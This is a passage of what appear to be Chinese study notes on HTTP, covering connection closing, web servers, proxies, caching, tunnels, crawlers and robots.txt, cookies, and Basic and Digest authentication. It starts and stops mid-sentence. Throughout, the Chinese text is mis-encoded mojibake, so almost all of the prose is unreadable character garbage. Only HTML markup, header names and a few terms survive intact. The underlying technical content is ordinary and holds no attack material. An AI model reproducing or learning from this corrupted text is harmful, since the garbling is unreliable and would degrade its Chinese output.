å®¢æˆ·ç«¯ã€æœåŠ¡å™¨æˆ–ä»£ç†éƒ½å¯ä»¥åœ¨ä»»æ„æ—¶åˆ»å…³é—­ä¸€æ¡ TCP ä¼ è¾“è¿æ¥ã€‚åœ¨æŒä¹…è¿æ¥ç©ºé—²ä¸€æ®µæ—¶é—´ä¹‹åï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šå†³å®šå°†å…¶å…³é—­ã€‚ä½†æ˜¯ï¼ŒæœåŠ¡å™¨æ°¸è¿œéƒ½æ— æ³•ç¡®å®šåœ¨å®ƒå…³é—­â€œç©ºé—²â€è¿æ¥çš„é‚£ä¸€åˆ»ï¼Œåœ¨çº¿è·¯é‚£ä¸€å¤´çš„å®¢æˆ·ç«¯æœ‰æ²¡æœ‰æ•°æ®è¦å‘é€ã€‚å¦‚æœå‡ºç°è¿™ç§æƒ…å†µï¼Œå®¢æˆ·ç«¯å°±ä¼šåœ¨å†™å…¥åŠæˆªè¯·æ±‚æŠ¥æ–‡æ—¶å‘ç°å‡ºç°äº†è¿æ¥é”™è¯¯ã€‚</p><p>æ¯æ¡HTTPå“åº”éƒ½åº”è¯¥æœ‰ç²¾ç¡®çš„<code>Content-Length</code>é¦–éƒ¨ï¼Œç”¨ä»¥æè¿°å“åº”ä¸»ä½“çš„å°ºå¯¸ã€‚å®¢æˆ·ç«¯æˆ–ä»£ç†æ”¶åˆ°ä¸€æ¡éšè¿æ¥å…³é—­è€Œç»“æŸçš„HTTPå“åº”ï¼Œä¸”å®é™…ä¼ è¾“çš„å®ä½“é•¿åº¦ä¸<code>Content-Length</code>å¹¶ä¸åŒ¹é…(æˆ–æ²¡æœ‰<code>Content -Length</code>)æ—¶ï¼Œæ¥æ”¶ç«¯å°±åº”è¯¥è´¨ç–‘é•¿åº¦çš„æ­£ç¡®æ€§ã€‚å¦‚æœæ¥æ”¶ç«¯æ˜¯ä¸ªç¼“å­˜ä»£ç†ï¼Œæ¥æ”¶ç«¯å°±ä¸åº”è¯¥ç¼“å­˜è¿™æ¡å“åº”(ä»¥é™ä½ä»Šåå°†æ½œåœ¨çš„é”™è¯¯æŠ¥æ–‡æ··åˆèµ·æ¥çš„å¯èƒ½)ã€‚ä»£ç†åº”è¯¥å°†æœ‰é—®é¢˜çš„æŠ¥æ–‡åŸå°ä¸åŠ¨åœ°è½¬å‘å‡ºå»ï¼Œè€Œä¸åº”è¯¥è¯•å›¾å»â€œæ ¡æ­£â€<code>Content-Length</code>ï¼Œä»¥ç»´æŠ¤è¯­ä¹‰çš„é€æ˜æ€§ã€‚</p><p>å³ä½¿åœ¨éé”™è¯¯æƒ…å†µä¸‹ï¼Œè¿æ¥ä¹Ÿå¯ä»¥åœ¨ä»»æ„æ—¶åˆ»å…³é—­ã€‚HTTPåº”ç”¨ç¨‹åºè¦åšå¥½æ­£ç¡®å¤„ç†éé¢„æœŸå…³é—­çš„å‡†å¤‡ã€‚å¦‚æœåœ¨å®¢æˆ·ç«¯æ‰§è¡Œäº‹åŠ¡çš„è¿‡ç¨‹ä¸­ï¼Œä¼ è¾“è¿æ¥å…³é—­äº†ï¼Œé‚£ä¹ˆï¼Œé™¤éäº‹åŠ¡å¤„ç†ä¼šå¸¦æ¥ä¸€äº›å‰¯ä½œç”¨ï¼Œå¦åˆ™å®¢æˆ·ç«¯å°±åº”è¯¥é‡æ–°æ‰“å¼€è¿æ¥ï¼Œå¹¶é‡è¯•ä¸€æ¬¡ã€‚å¯¹ç®¡é“åŒ–è¿æ¥æ¥è¯´ï¼Œè¿™ç§æƒ…å†µæ›´åŠ ä¸¥é‡-äº›ã€‚å®¢æˆ·ç«¯å¯ä»¥å°†å¤§é‡è¯·æ±‚æ”¾å…¥é˜Ÿåˆ—ä¸­æ’é˜Ÿï¼Œä½†æºç«¯æœåŠ¡å™¨å¯ä»¥å…³é—­è¿æ¥ï¼Œè¿™æ ·å°±ä¼šç•™ä¸‹å¤§é‡æœªå¤„ç†çš„è¯·æ±‚ï¼Œéœ€è¦é‡æ–°è°ƒåº¦ã€‚å‰¯ä½œç”¨æ˜¯å¾ˆé‡è¦çš„é—®é¢˜ã€‚å¦‚æœåœ¨å‘é€å‡ºä¸€äº›è¯·æ±‚æ•°æ®ä¹‹åï¼Œæ”¶åˆ°è¿”å›ç»“æœä¹‹å‰ï¼Œè¿æ¥å…³é—­äº†ï¼Œå®¢æˆ·ç«¯å°±æ— æ³•ç™¾åˆ†ä¹‹ç™¾åœ°ç¡®å®šæœåŠ¡å™¨ç«¯å®é™…æ¿€æ´»äº†å¤šå°‘äº‹åŠ¡ã€‚æœ‰äº›äº‹åŠ¡ï¼Œæ¯”å¦‚GETä¸€ä¸ªé™æ€çš„HTMLé¡µé¢ï¼Œå¯ä»¥åå¤æ‰§è¡Œå¤šæ¬¡ï¼Œä¹Ÿä¸ä¼šæœ‰ä»€ä¹ˆå˜åŒ–ã€‚è€Œå…¶ä»–ä¸€äº›äº‹åŠ¡ï¼Œæ¯”å¦‚å‘ä¸€ä¸ªåœ¨çº¿ä¹¦åº—POSTä¸€å¼ è®¢å•ï¼Œå°±ä¸èƒ½é‡å¤æ‰§è¡Œï¼Œä¸ç„¶ä¼šæœ‰ä¸‹å¤šå¼ è®¢å•çš„å±é™©ã€‚</p><p>TCP æ˜¯åŒå‘çš„ï¼ŒTCP è¿æ¥çš„æ¯ä¸€ç«¯éƒ½æœ‰ä¸€ä¸ªè¾“å…¥é˜Ÿåˆ—å’Œä¸€ä¸ªè¾“å‡ºé˜Ÿåˆ—ï¼Œç”¨äºæ•°æ®çš„è¯»æˆ–è€…å†™ã€‚å¦‚æœå¦ä¸€ç«¯å‘ä½ å·²å…³é—­çš„è¾“å…¥ä¿¡é“å‘é€æ•°æ®ï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šå‘å¦ä¸€ç«¯çš„æœºå™¨å›é€ä¸€æ¡ TCPâ€œè¿æ¥è¢«å¯¹ç«¯é‡ç½®â€çš„æŠ¥æ–‡ã€‚å®ç°æ­£å¸¸å…³é—­çš„åº”ç”¨ç¨‹åºé¦–å…ˆåº”è¯¥å…³é—­å®ƒä»¬çš„è¾“å‡ºä¿¡é“ï¼Œç„¶åç­‰å¾…è¿æ¥å¦ä¸€ç«¯çš„å¯¹ç­‰å®ä½“å…³é—­å®ƒçš„è¾“å‡ºä¿¡é“ã€‚å½“ä¸¤ç«¯éƒ½å‘Šè¯‰å¯¹æ–¹å®ƒä»¬ä¸ä¼šå†å‘é€ä»»ä½•æ•°æ®(æ¯”å¦‚å…³é—­è¾“å‡ºä¿¡é“)ä¹‹åï¼Œè¿æ¥å°±ä¼šè¢«å®Œå…¨å…³é—­ï¼Œè€Œä¸ä¼šæœ‰é‡ç½®çš„å±é™©ã€‚</p><h1 id="ç¬¬5ç« -Web-æœåŠ¡å™¨"><a href="#ç¬¬5ç« -Web-æœåŠ¡å™¨" class="headerlink" title="ç¬¬5ç«  Web æœåŠ¡å™¨"></a>ç¬¬5ç«  Web æœåŠ¡å™¨</h1><p>æœåŠ¡å™¨çš„å·¥ä½œæµç¨‹ï¼š</p><ol><li>å»ºç«‹è¿æ¥ - æ¥å—ä¸€ä¸ªå®¢æˆ·ç«¯è¿æ¥ï¼Œä¸å¸Œæœ›å»ºç«‹è¿æ¥åˆ™å…³é—­</li><li>æ¥æ”¶è¯·æ±‚ - ä»ç½‘ç»œä¸­è¯»å–ä¸€æ¡ HTTP è¯·æ±‚æŠ¥æ–‡</li><li>å¤„ç†è¯·æ±‚ - å¯¹è¯·æ±‚æŠ¥æ–‡è¿›è¡Œè§£é‡Šï¼Œå¹¶é‡‡å–è¡ŒåŠ¨</li><li>è®¿é—®èµ„æº - è®¿é—®æŠ¥æ–‡ä¸­æŒ‡å®šçš„èµ„æº</li><li>æ„å»ºå“åº” - åˆ›å»ºå¸¦æœ‰æ­£ç¡®é¦–éƒ¨çš„ HTTP å“åº”æŠ¥æ–‡</li><li>å‘é€å“åº” - å°†å“åº”å›é€ç»™å®¢æˆ·ç«¯</li><li>è®°å½•äº‹åŠ¡å¤„ç†è¿‡ç¨‹ - å°†ä¸å·²å®Œæˆäº‹åŠ¡æœ‰å…³çš„å†…å®¹è®°å½•åœ¨ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­</li></ol><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gadpha81d0j30ks0cqdjj.jpg" alt=""></p><h1 id="ç¬¬6ç« -ä»£ç†"><a href="#ç¬¬6ç« -ä»£ç†" class="headerlink" title="ç¬¬6ç«  ä»£ç†"></a>ç¬¬6ç«  ä»£ç†</h1><h2 id="ä¸ºä»€ä¹ˆä½¿ç”¨ä»£ç†"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨ä»£ç†" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨ä»£ç†"></a>ä¸ºä»€ä¹ˆä½¿ç”¨ä»£ç†</h2><ul><li>å„¿ç«¥è¿‡æ»¤å™¨</li><li>æ–‡æ¡£è®¿é—®æ§åˆ¶</li><li>å®‰å…¨é˜²ç«å¢™</li><li>Web ç¼“å­˜</li><li>åå‘ä»£ç†</li><li>å†…å®¹è·¯ç”±å™¨</li><li>è½¬ç å™¨</li><li>åŒ¿åæ€§<ul><li>åŒ¿åä»£ç†ä¼šä¸»åŠ¨ä» HTTP æŠ¥æ–‡ä¸­åˆ é™¤èº«ä»½ç‰¹æ€§ï¼Œå¦‚å®¢æˆ·ç«¯ IPï¼ŒFrom é¦–éƒ¨ï¼ŒReferer é¦–éƒ¨ï¼Œcookieï¼ŒURI å›è¯ ID ç­‰ï¼Œä»è€Œæä¾›é«˜åº¦ç§å¯†æ€§å’ŒåŒ¿åæ€§ã€‚</li></ul></li></ul><p>Via é¦–éƒ¨å­—æ®µåˆ—å‡ºäº†ä¸æŠ¥æ–‡é€”ç»çš„æ¯ä¸ªä¸­é—´èŠ‚ç‚¹ï¼ˆä»£ç†æˆ–ç½‘å…³ï¼‰æœ‰å…³çš„ä¿¡æ¯ã€‚</p><h1 id="ç¬¬7ç« -ç¼“å­˜"><a href="#ç¬¬7ç« -ç¼“å­˜" class="headerlink" title="ç¬¬7ç«  ç¼“å­˜"></a>ç¬¬7ç«  ç¼“å­˜</h1><p>ç¼“å­˜çš„ä¼˜ç‚¹ï¼š</p><ul><li>å‡å°‘äº†å†—ä½™çš„æ•°æ®ä¼ è¾“</li><li>ç¼“è§£äº†ç½‘ç»œç“¶é¢ˆçš„é—®é¢˜</li><li>é™ä½äº†å¯¹åŸå§‹æœåŠ¡å™¨çš„è¦æ±‚</li><li>é™ä½äº†è·ç¦»æ—¶å»¶</li></ul><p>ç¼“å­˜çš„ç¼ºç‚¹ï¼š</p><ul><li>æœªåŠæ—¶æ›´æ–°çš„ç¼“å­˜é€ æˆä¿¡æ¯æ»åï¼Œå¦‚æŠ¢è´­æ—¶çš„åº“å­˜ç¼“å­˜å¯èƒ½å¯¼è‡´è¶…å”®</li><li>ç¼“å­˜ä¼šå ç”¨ç©ºé—´èµ„æº</li></ul><p>è¿‡æœŸæ—¥æœŸä»¥<code>Expires</code>æˆ–<code>Cache-Control: max-age=86400</code>æ¥æ§åˆ¶ï¼ŒäºŒè€…çš„åŒºåˆ«åœ¨äºï¼Œå‰è€…æ˜¯ä¸€ä¸ªç»å¯¹æ—¶é—´ï¼Œå¦‚ <code>Expires: Fri, 05 Jul 2002, 05:00:00 GMT</code>ï¼Œåè€…åˆ™æ˜¯ä¸€ä¸ªç›¸å¯¹æ—¶é—´ï¼ˆå•ä½ä¸ºç§’ï¼‰ã€‚æˆ‘ä»¬æ›´æ¨èä½¿ç”¨ç›¸å¯¹æ—¶é—´ï¼Œå› ä¸ºç»å¯¹æ—¶é—´ä¾èµ–äºè®¡ç®—æœºæ—¶é’Ÿçš„æ­£ç¡®è®¾ç½®ã€‚</p><h1 id="ç¬¬8ç« -é›†æˆç‚¹ï¼šç½‘å…³ã€éš§é“åŠä¸­ç»§"><a href="#ç¬¬8ç« -é›†æˆç‚¹ï¼šç½‘å…³ã€éš§é“åŠä¸­ç»§" class="headerlink" title="ç¬¬8ç«  é›†æˆç‚¹ï¼šç½‘å…³ã€éš§é“åŠä¸­ç»§"></a>ç¬¬8ç«  é›†æˆç‚¹ï¼šç½‘å…³ã€éš§é“åŠä¸­ç»§</h1><p>Web éš§é“å…è®¸ç”¨æˆ·é€šè¿‡ HTTP è¿æ¥å‘é€é HTTP æµé‡ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ HTTP ä¸Šæå¸¦å…¶å®ƒåè®®æ•°æ®äº†ã€‚ä½¿ç”¨ Web éš§é“æœ€å¸¸è§çš„åŸå› å°±æ˜¯è¦åœ¨ HTTP è¿æ¥ä¸­åµŒå…¥é HTTP æµé‡ï¼Œè¿™æ ·ï¼Œè¿™ç±»æµé‡å°±å¯ä»¥ç©¿è¿‡åªå…è®¸ Web æµé‡é€šè¿‡çš„é˜²ç«å¢™äº†ã€‚</p><p>Web éš§é“æ˜¯é€šè¿‡ HTTP çš„ CONNECT æ–¹æ³•å»ºç«‹èµ·æ¥çš„ã€‚</p><p>ç›²ä¸­ç»§å¯èƒ½å¯¼è‡´ keep-alive çš„æŒ‚èµ·<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaeqdw9524j318s0gsqcf.jpg" alt=""></p><h1 id="ç¬¬9ç« -Web-æœºå™¨äºº"><a href="#ç¬¬9ç« -Web-æœºå™¨äºº" class="headerlink" title="ç¬¬9ç«  Web æœºå™¨äºº"></a>ç¬¬9ç«  Web æœºå™¨äºº</h1><h2 id="çˆ¬è™«çš„å·¥ä½œæµ"><a href="#çˆ¬è™«çš„å·¥ä½œæµ" class="headerlink" title="çˆ¬è™«çš„å·¥ä½œæµ"></a>çˆ¬è™«çš„å·¥ä½œæµ</h2><p>çˆ¬è™«ä»æ ¹é›†å¼€å§‹ï¼Œçˆ¬å–æ‰€éœ€çš„å¤§å¤šæ•°é¡µé¢ï¼Œåœ¨ä»¥ä¸‹çš„ç¤ºä¾‹ä¸­ï¼Œæ ¹é›†åªéœ€è¦ Aã€Gã€S å³å¯æŠ“å–åˆ°æ‰€æœ‰é¡µé¢ã€‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaervii1rjj30zu0eq42u.jpg" alt=""></p><p>çˆ¬è™«åœ¨ Web ä¸Šç§»åŠ¨æ—¶ï¼Œä¼šä¸åœåœ°å¯¹ HTML é¡µé¢è¿›è¡Œè§£æï¼Œå®ƒè¦å¯¹æ‰€è§£æçš„æ¯ä¸ªé¡µé¢ä¸Šçš„ URL é“¾æ¥è¿›è¡Œåˆ†æï¼Œå¹¶å°†è¿™äº›é“¾æ¥æ·»åŠ åˆ°éœ€è¦çˆ¬è¡Œçš„é¡µé¢åˆ—è¡¨ä¸­å»ã€‚éšç€çˆ¬è™«çš„å‰è¿›ï¼Œå½“æœŸå‘ç°éœ€è¦æ¢æŸ¥çš„æ–°é“¾æ¥æ—¶ï¼Œè¿™ä¸ªåˆ—è¡¨å¸¸å¸¸ä¼šè¿…é€Ÿåœ°æ‰©å¼ ã€‚çˆ¬è™«è¦é€šè¿‡ç®€å•çš„ HTML è§£æï¼Œå°†è¿™äº›é“¾æ¥æå–å‡ºæ¥ï¼Œå¹¶å°†ç›¸å¯¹ URL è½¬æ¢ä¸ºç»å¯¹å½¢å¼ã€‚</p><h2 id="å¾ªç¯é™·é˜±"><a href="#å¾ªç¯é™·é˜±" class="headerlink" title="å¾ªç¯é™·é˜±"></a>å¾ªç¯é™·é˜±</h2><p>çˆ¬è™«åœ¨æŠ“å–é¡µé¢æ—¶ï¼Œè¦ç‰¹åˆ«å°å¿ƒä¸è¦é™·å…¥å¾ªç¯ã€‚çˆ¬è™«å¿…é¡»çŸ¥é“å®ƒä»¬æ‰€åˆ°ä¹‹å¤„ï¼Œä»¥é¿å…ç¯è·¯çš„å‡ºç°ã€‚ä¸€äº›å¤æ‚çš„çˆ¬è™«å¯èƒ½ä¼šç”¨æœç´¢æ ‘æˆ–æ•£åˆ—è¡¨æ¥è®°å½•å·²è®¿é—®çš„ URLã€‚</p><p>å¤§å‹çˆ¬è™«ä¼šé‡‡ç”¨â€œé›†ç¾¤â€çš„æ–¹å¼ï¼Œæ¯ä¸ªçˆ¬è™«åˆ†é…ä¸€ä¸ªç‰¹å®šçš„ URLâ€œç‰‡â€ï¼Œç„¶åé…åˆæŠ“å–æ•´ä¸ª Webã€‚</p><p>åˆ«åä¸æœºå™¨äººç¯è·¯<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaesvn44oaj31a20i6k3z.jpg" alt=""></p><p>è§£å†³å¾ªç¯é™·é˜±çš„æ–¹æ³•</p><ul><li>è§„èŒƒåŒ– URL<ul><li>å¦‚æœæ²¡æœ‰æŒ‡å®šç«¯å£çš„è¯ï¼Œå°±åƒä¸»æœºåä¸­æ·»åŠ â€:80â€</li><li>å°†æ‰€æœ‰è½¬ä¹‰ç¬¦ %xx éƒ½è½¬æ¢æˆç­‰ä»·å­—ç¬¦</li><li>åˆ é™¤ # æ ‡ç­¾</li></ul></li><li>å¹¿åº¦ä¼˜å…ˆçš„çˆ¬è¡Œ<ul><li>å¦‚æœé‡‡ç”¨äº†æ·±åº¦ä¼˜å…ˆï¼Œå¾ˆæœ‰å¯èƒ½ä¼šé™·å…¥å¾ªç¯ï¼Œæ— æ³•è®¿é—®å…¶å®ƒç«™ç‚¹</li></ul></li><li>èŠ‚æµ<ul><li>é™åˆ¶ä¸€æ®µæ—¶é—´å†…æœºå™¨äººå¯ä»¥ä»ä¸€ä¸ª web ç«™ç‚¹è·å–çš„é¡µé¢æ•°é‡</li></ul></li><li>é™åˆ¶ URL çš„å¤§å°<ul><li>ç°åœ¨å¾ˆå¤šç«™ç‚¹éƒ½ä¼šç”¨ URL æ¥ç®¡ç†ç”¨æˆ·çš„çŠ¶æ€ï¼ˆå¦‚ï¼Œåœ¨ä¸€ä¸ªé¡µé¢å¼•ç”¨çš„ URL ä¸­å­˜å‚¨ç”¨æˆ· IDï¼‰ï¼Œè¿™å¯èƒ½ä¼šè®©ä½ é”™è¿‡ä¸€äº›ä¸œè¥¿</li></ul></li><li>URL/ç«™ç‚¹é»‘åå•</li><li>æ¨¡å¼æ£€æµ‹</li><li>å†…å®¹æŒ‡çº¹<ul><li>å°†é‡‡é›†çš„å†…å®¹è®¡ç®—æ ¡éªŒå’Œï¼Œé¿å…é‡å¤é‡‡é›†</li></ul></li><li>äººå·¥ç›‘è§†<ul><li>å½“çˆ¬è™«é‡åˆ°å›°éš¾æ—¶å¯ä»¥åŠæ—¶å‘å‡ºè­¦å‘Š</li></ul></li></ul><p>é«˜çº§çˆ¬è™«åªåœ¨å†…å®¹å‘ç”Ÿäº†å˜åŒ–æ—¶æ‰é‡æ–°è·å–å†…å®¹ï¼Œå®ƒä»¬å®ç°äº†æ¡ä»¶ HTTP è¯·æ±‚ï¼Œå³å®ƒä»¬ä¼šå¯¹æ—¶é—´æˆ³æˆ–å®ä½“æ ‡ç­¾è¿›è¡Œæ¯”è¾ƒï¼ŒæŸ¥çœ‹æœ€è¿‘çš„å†…å®¹æ˜¯å¦å‘ç”Ÿå˜åŒ–ã€‚</p><p>Web ç®¡ç†è€…åº”è¯¥è®°ä½ï¼Œä¸æ­¢ç”¨æˆ·ä¼šè®¿é—®ç«™ç‚¹ï¼Œä¹Ÿä¼šæœ‰å¾ˆå¤šçˆ¬è™«æ¥è®¿é—®ç«™ç‚¹ã€‚</p><h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>å¦‚æœç½‘ç«™ä¸å¸Œæœ›çˆ¬è™«é‡‡é›†æŸäº›é¡µé¢ï¼Œå¯ä»¥åœ¨æ ¹ç›®å½•ä¸‹æ”¾ç½®<code>robots.txt</code>æ–‡ä»¶ï¼ˆå› ä¸ºä¸€äº›ç³»ç»Ÿä¸­çš„ URL æ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œæ‰€ä»¥ robots.txt çš„æ–‡ä»¶ååº”ç»Ÿä¸€ä¸ºå°å†™ï¼‰ï¼Œå£°æ˜å“ªäº›æ˜¯å…è®¸æŠ“å–çš„ï¼Œå“ªäº›æ˜¯ä¸å…è®¸æŠ“å–çš„ï¼Œå¦‚<a href="https://www.baidu.com/robots.txt" target="_blank" rel="noopener">ç™¾åº¦çš„robots.txt</a>ï¼Œ<a href="https://cn.bing.com/robots.txt" target="_blank" rel="noopener">å¿…åº”çš„ robots.txt</a>ï¼Œ<a href="https://www.zhihu.com/robots.txt" target="_blank" rel="noopener">çŸ¥ä¹çš„robots.txt</a>ã€‚è¯¥æ–‡ä»¶å¹¶ä¸æ˜¯è§„èŒƒï¼Œåªèƒ½é™åˆ¶éµå¾ªè§„åˆ™çš„çˆ¬è™«ï¼Œå¹¶ä¸ä»£è¡¨å£°æ˜ç¦æ­¢æŠ“å–çš„å†…å®¹ä¸€å®šä¸ä¼šè¢«æŠ“å–ã€‚</p><p>çˆ¬è™«åº”è¯¥é¦–å…ˆè®¿é—® robots.txt æ–‡ä»¶ï¼Œå¹¶æ ¹æ®è¯¥æ–‡ä»¶çŠ¶æ€å’Œå†…å®¹æ¥å†³å®šæœ€ç»ˆçš„è®¿é—®ã€‚å³è¯¥æ–‡ä»¶æ˜¯ 401 æˆ– 403 æ—¶ï¼Œè¡¨æ˜è¯¥ç½‘ç«™å—é™ï¼›503 æ—¶ï¼Œè¡¨æ˜è¯¥ç½‘ç«™å½“å‰ä¸å¯ç”¨ï¼Œåº”æ¨è¿Ÿè®¿é—®ï¼›404 åˆ™è¡¨ç¤ºæ— ä»»ä½•é™åˆ¶ï¼›200 åˆ™éœ€è¦ä¾æ®æ–‡ä»¶å†…å®¹è®¿é—®ç½‘ç«™ã€‚</p><h2 id="æœç´¢"><a href="#æœç´¢" class="headerlink" title="æœç´¢"></a>æœç´¢</h2><p>å½“ä½ åœ¨æœç´¢å¼•æ“ä¸­é”®å…¥å…³é”®å­—æ—¶ï¼Œå¯èƒ½ä¼šæœ‰æ•°ä»¥äº¿è®¡çš„æ–‡ä»¶ä¸­åŒ…å«è¯¥å…³é”®å­—ï¼Œå› æ­¤ï¼Œå¦‚ä½•å¯¹è¿™äº›æ–‡ä»¶æ’åºæˆä¸ºäº†å„æœç´¢å¼•æ“çš„å…³é”®ã€‚é€šå¸¸æ¥è¯´ï¼Œç”¨æˆ·ä¼šç‚¹å‡»æ’åé å‰çš„æœç´¢ç»“æœï¼Œå¦‚ä½•æ‰èƒ½è®©ç”¨æˆ·æœ€å¿«æ‰¾åˆ°è‡ªå·±æƒ³è¦çš„å‘¢ï¼Ÿå¾ˆå¤šæœç´¢å¼•æ“ä¼šå°†é¡µé¢çš„è¢«å¼•ç”¨æ¬¡æ•°ä½œä¸ºé‡è¦çš„æ’åä¾æ®ï¼Œè¢«å¼•ç”¨è¶Šå¤šï¼Œè¯´æ˜è¯¥é¡µé¢ä»·å€¼ä¹Ÿé«˜ï¼Œç”¨æˆ·ä¹Ÿæœ€å¯èƒ½å¾—åˆ°æƒ³è¦çš„ä¸œè¥¿ã€‚</p><p>éƒ¨åˆ†ç½‘ç«™ä¸ºäº†è·å–è¾ƒé«˜çš„æ’åï¼Œåˆ—å‡ºäº†æ— æ•°çš„å…³é”®å­—ï¼Œç”šè‡³æœ‰äº›æ˜¯æ¯«ä¸ç›¸å¹²çš„ï¼Œå› æ­¤éœ€è¦çˆ¬è™«èƒ½å¤ŸåŠæ—¶è¯†åˆ«å¹¶è¿‡æ»¤æ­¤ç±»é¡µé¢ã€‚</p><h1 id="ç¬¬10ç« -HTTP-NG"><a href="#ç¬¬10ç« -HTTP-NG" class="headerlink" title="ç¬¬10ç«  HTTP-NG"></a>ç¬¬10ç«  HTTP-NG</h1><h1 id="ç¬¬11ç« -å®¢æˆ·ç«¯è¯†åˆ«ä¸-cookie-æœºåˆ¶"><a href="#ç¬¬11ç« -å®¢æˆ·ç«¯è¯†åˆ«ä¸-cookie-æœºåˆ¶" class="headerlink" title="ç¬¬11ç«  å®¢æˆ·ç«¯è¯†åˆ«ä¸ cookie æœºåˆ¶"></a>ç¬¬11ç«  å®¢æˆ·ç«¯è¯†åˆ«ä¸ cookie æœºåˆ¶</h1><p>ä¸ºäº†ä½¿ Web ç«™ç‚¹çš„ç™»é™†æ›´åŠ ç®€ä¾¿ï¼ŒHTTP ä¸­åŒ…å«äº†ä¸€ç§å†…å»ºæœºåˆ¶ï¼Œå¯ä»¥ç”¨ WWW-Authenticate é¦–éƒ¨å’Œ Authorization é¦–éƒ¨å‘ Web ç«™ç‚¹ä¼ é€ç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯ã€‚</p><p>æœ¬ç«  cookieå†…å®¹è¾ƒä¸ºç®€å•ä¸”å·²è¿‡æ—¶ï¼Œéœ€è¦å½“å‰çš„æµè§ˆå™¨ä¸å¼€å‘æ¡†æ¶å¯¹ cookie çš„å¤„ç†åŠç®¡ç†ï¼Œä»¥åŠæœªæ¥å¦‚ä½•æ›´åŠ å‡†ç¡®è¯†åˆ«ç”¨æˆ·ï¼Œå¹¶è®©ä¿è¯ç”¨æˆ·çš„ä¿¡æ¯ä¸ä¼šè¢«æ³„éœ²ã€‚å½“å‰ç¼“è§£ç”¨æˆ·åœ¨æ¯ä¸ªç½‘ç«™æ³¨å†Œè´¦æˆ·çš„æ–¹å¼æ˜¯å¼•å…¥ç”¨æˆ·çš„ç¤¾äº¤è´¦æˆ·ç™»å½•ï¼Œæœªæ¥æ˜¯å¦å¯ä»¥è®©æ‰€æœ‰ç”¨æˆ·ä»¥ç»Ÿä¸€æ–¹å¼ç™»å½•æ‰€æœ‰ç½‘ç«™ï¼Œè€Œä¸”è¿™äº›ç½‘ç«™è·å–ä¸åˆ°ç”¨æˆ·çš„çœŸå®ä¿¡æ¯ï¼ŒeID æˆ–è®¸æ˜¯æœªæ¥çš„ä¸€ä¸ªæ–¹å‘ã€‚</p><h1 id="ç¬¬12ç« -åŸºæœ¬è®¤è¯æœºåˆ¶"><a href="#ç¬¬12ç« -åŸºæœ¬è®¤è¯æœºåˆ¶" class="headerlink" title="ç¬¬12ç«  åŸºæœ¬è®¤è¯æœºåˆ¶"></a>ç¬¬12ç«  åŸºæœ¬è®¤è¯æœºåˆ¶</h1><p>æœåŠ¡å™¨å¯¹ç”¨æˆ·è¿›è¡Œè´¨è¯¢æ—¶ï¼Œä¼šè¿”å›ä¸€æ¡ 401 å“åº”ï¼Œå¹¶åœ¨<code>WWW-Authenticate</code>é¦–éƒ¨è¯´æ˜å¦‚ä½•ä»¥åŠåœ¨å“ªé‡Œè®¤è¯ï¼Œå¦‚ä»¥ä¸‹ç¤ºä¾‹ã€‚å…¶ä¸­ï¼Œ<code>realm</code>æ˜¯å®‰å…¨åŸŸï¼Œå¸®åŠ©ç”¨æˆ·äº†è§£åº”è¯¥ä½¿ç”¨å“ªä¸ªè´¦å·å¯†ç ï¼ˆä¸åŒèµ„æºæœ‰ä¸åŒçš„è®¿é—®æƒé™ï¼Œæ¯ä¸ªå®‰å…¨åŸŸéƒ½æœ‰ä¸åŒçš„æˆæƒç”¨æˆ·é›†ï¼‰</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">401</span> Unauthorized</span><br><span class="line"><span class="attribute">WWW-Authenticate</span>: Basic realm="Corporate Financials"</span><br></pre></td></tr></table></figure><p>å½“å®¢æˆ·ç«¯æ”¶åˆ° 401 æ—¶ï¼Œå¡«å†™è´¦å·å¯†ç åï¼Œä¼šåœ¨<code>Authorization</code>é¦–éƒ¨é™„åŠ ç» base64 ç¼–ç çš„<code>è´¦å·:å¯†ç </code>å½¢å¼çš„è®¤è¯ä¿¡æ¯ã€‚å¦‚ä»¥ä¸‹è¯·æ±‚çš„è®¤è¯ä¿¡æ¯å³ä¸º<code>username:passowrd</code>çš„ç¼–ç ç»“æœã€‚<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gafqe4gnp4j30t40kgn03.jpg" alt=""></p><p>ä»åŸºæœ¬è®¤è¯çš„å·¥ä½œæµä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç”¨æˆ·çš„è´¦å·å¯†ç å‡ ä¹å°±æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œè¿™é€ æˆäº†å¾ˆå¤§çš„å®‰å…¨éšæ‚£ï¼Œå®‰å…¨ä½¿ç”¨åŸºæœ¬è®¤è¯çš„å”¯ä¸€æ–¹å¼å°±æ˜¯å°†å…¶ä¸ SSL é…åˆä½¿ç”¨ã€‚</p><h1 id="ç¬¬13ç« -æ‘˜è¦è®¤è¯"><a href="#ç¬¬13ç« -æ‘˜è¦è®¤è¯" class="headerlink" title="ç¬¬13ç«  æ‘˜è¦è®¤è¯"></a>ç¬¬13ç«  æ‘˜è¦è®¤è¯</h1><p>æ‘˜è¦è®¤è¯çš„ç®´è¨€æ˜¯â€œç»ä¸é€šè¿‡ç½‘ç»œå‘é€å¯†ç â€ã€‚å®¢æˆ·ç«¯ä¸ä¼šå‘é€å¯†ç ï¼Œè€Œæ˜¯ä¼šå‘é€ä¸€ä¸ªâ€œæŒ‡çº¹â€æˆ–å¯†ç çš„â€œæ‘˜è¦â€ï¼Œè¿™æ˜¯å¯†ç çš„ä¸å¯é€†æ‰°ç ã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éƒ½çŸ¥é“è¿™ä¸ªå¯†ç ï¼Œå› 